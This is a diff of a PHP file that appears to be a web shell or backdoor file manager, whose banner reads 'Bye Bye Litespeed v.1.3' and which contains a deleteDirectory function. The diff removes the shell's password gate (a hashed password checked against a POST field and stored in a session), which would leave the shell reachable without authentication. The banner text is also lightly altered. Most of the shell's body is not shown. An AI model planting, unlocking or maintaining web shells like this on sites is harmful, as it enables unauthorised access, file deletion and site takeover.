@@ -1,24 +1,3 @@
-<?php
-
-session_start();
-
-$pwd = '$2y$10$LAT5Hs6OfwUZLmUVcv8hXewsbneO7g6i0CLY7te.oIE6t7XTkny36';
-if (isset($_POST['dandi']) && !empty($_POST['dandi'])) {
-    if (password_verify($_POST['dandi'], $pwd)) {
-        $_SESSION['dandikontol'] = 'dandikontol';
-    }
-}
-
-if (!isset($_SESSION['dandikontol'])) :
-
-?>
-
-<form action="" method="post">
-    <input type="password" name="dandi">
-</form>
-<?php else: ?>
-
-
 <!DOCTYPE html>
 <html>
 <head>
@@ -293,9 +272,9 @@ if ($_SERVER['REQUEST_METHOD'] === 'POST') {
 
 echo '<center>
 <div class="fig-ansi">
-<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  _    Bye Bye Litespeed   ____ __    
-    _|  |__ __ __ __ __   |   __|  | v.1.3
-|  |  | .\'| . | . | .\'|   |  |_   |  |_ 
+<pre id="taag_font_ANSIShadow" class="fig-ansi"><span style="color: rgb(67, 142, 241);">   <strong>  __    Bye Bye Litespeed   _____ __    
+    __|  |___ ___ ___ ___ ___   |   __|  | v.1.3
+|  |  | .\'| . | . | .\'|   |  |__   |  |__ 
 |_____|__,|_  |___|__,|_|_|  |_____|_____|
                 |___| ./Heartzz                      </strong> </span></pre>
 </div>
@@ -378,5 +357,3 @@ function deleteDirectory($dir) {
 </div>
 </body>
 </html>
-
-<?php endif; ?>
